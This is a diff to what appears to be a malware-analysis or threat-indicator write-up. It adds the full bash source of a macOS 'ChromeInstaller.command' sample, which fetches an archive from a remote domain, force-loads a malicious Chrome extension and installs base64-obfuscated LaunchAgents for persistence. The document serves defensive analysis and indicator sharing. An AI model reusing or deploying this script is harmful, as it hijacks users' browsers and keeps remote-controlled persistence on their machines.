@@ -33,6 +33,136 @@ Reported Hashes for `ChromeInstaller.command`:
 ea372007cc140941c76bad138b8088a9b0333d4c3fd31980a141b3026aa69700
 ```
 
+Contents of a sample of `ChromeInstaller.command`.  Sample provided by @th3_protoCOL
+
+https://bazaar.abuse.ch/sample/5daa07b6c9d3836a864ad9df5773823aa8b3be1470bea93aad0be09c6023cd67/
+
+```
+#!/bin/bash
+
+osascript -e 'tell application "Terminal" to set visible of front window to false'
+
+BPATH="/private/var/tmp"
+IPATH=$(uuidgen)
+
+EXISTS=`launchctl list | grep "chrome.extension"`
+SUB=chrome.extension
+if [[ "$EXISTS" == *"$SUB"* ]]; then
+  exit 0
+fi
+
+status_code=$(curl --write-out %{http_code} --head --silent --output /dev/null https://uiremukent.com/archive.zip  )
+if [[ "$status_code" = 200 ]] ; then
+  curl -s https://uiremukent.com/archive.zip > $BPATH/$IPATH.zip /dev/null
+else
+  exit 0
+fi
+
+sleep 1
+XPATH=$(uuidgen)
+unzip -o $BPATH/$IPATH.zip -d $BPATH/$XPATH &> /dev/null
+cd $BPATH/$XPATH
+
+sleep 0.5
+perform=$(echo -ne "if ps ax | grep -v grep | grep 'Google Chrome' &> /dev/null; then echo running;  EXTENSION_SERVICE='Google Chrome --load-extension'; if ps ax | grep -v grep | grep 'Google Chrome --load-extension' &> /dev/null; then echo e running; else   pkill -a -i 'Google Chrome'; sleep 1 ;  open -a 'Google Chrome' --args --load-extension='$BPATH/$XPATH' --restore-last-session --noerrdialogs --disable-session-crashed-bubble; fi;  else echo not running; fi" | base64);
+
+cd $BPATH
+touch com.chrome.extension.plist
+cat > com.chrome.extension.plist <<EOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>RunAtLoad</key>
+	<true/>
+	<key>StartInterval</key>
+	<integer>31</integer>
+	<key>Label</key>
+	<string>com.chrome.extension</string>
+	<key>ProgramArguments</key>
+	<array>
+		<string>sh</string>
+		<string>-c</string>
+		<string>echo $perform | base64 --decode | bash</string>
+	</array>
+</dict>
+</plist>
+EOF
+
+sleep 1
+
+performNext=$(echo -ne "pkill -a -i 'Google Chrome'; sleep 1 ;  open -a 'Google Chrome' --args --load-extension='$BPATH/$XPATH' --restore-last-session --noerrdialogs --disable-session-crashed-bubble;" | base64);
+touch com.chrome.extensions.plist
+cat > com.chrome.extensions.plist <<EOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>StartInterval</key>
+	<integer>21600</integer>
+	<key>Label</key>
+	<string>com.chrome.extensions</string>
+	<key>ProgramArguments</key>
+	<array>
+		<string>sh</string>
+		<string>-c</string>
+		<string>echo $performNext | base64 --decode | bash</string>
+	</array>
+</dict>
+</plist>
+EOF
+
+status_code=$(curl --write-out %{http_code} --head --silent --output /dev/null https://uiremukent.com/gp  )
+if [[ "$status_code" = 200 ]] ; then
+  popUrl=$(curl -s 'https://uiremukent.com/gp')
+  performPop=$(echo -ne "open -na 'Google Chrome' --args -load-extension='$BPATH/$XPATH' --new-window '"$popUrl"';" | base64);
+else
+  popUrl="0"
+fi
+
+mkdir -p ~/Library/LaunchAgents/
+cp com.chrome.extension.plist ~/Library/LaunchAgents/
+cp com.chrome.extensions.plist ~/Library/LaunchAgents/
+
+rm -Rf $BPATH/$IPATH.zip
+rm -Rf $BPATH/com.chrome.extension.plist
+rm -Rf $BPATH/com.chrome.extensions.plist
+
+sleep 0.5
+launchctl load ~/Library/LaunchAgents/com.chrome.extension.plist
+sleep 0.5
+launchctl load ~/Library/LaunchAgents/com.chrome.extensions.plist
+
+if ! [[ "$popUrl" == "0" ]]; then
+
+  touch com.chrome.extensionsPop.plist
+cat > com.chrome.extensionsPop.plist <<EOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+  <key>StartInterval</key>
+  <integer>3600</integer>
+  <key>Label</key>
+  <string>com.chrome.extensionsPop</string>
+  <key>ProgramArguments</key>
+  <array>
+    <string>sh</string>
+    <string>-c</string>
+    <string>echo $performPop | base64 --decode | bash</string>
+  </array>
+</dict>
+</plist>
+EOF
+
+  cp com.chrome.extensionsPop.plist ~/Library/LaunchAgents/
+  rm -Rf $BPATH/com.chrome.extensionsPop.plist
+
+  sleep 0.5
+  launchctl load ~/Library/LaunchAgents/com.chrome.extensionsPop.plist
+fi
+```
+
 Domains associated with `ChromeInstaller.command`
 
 ```
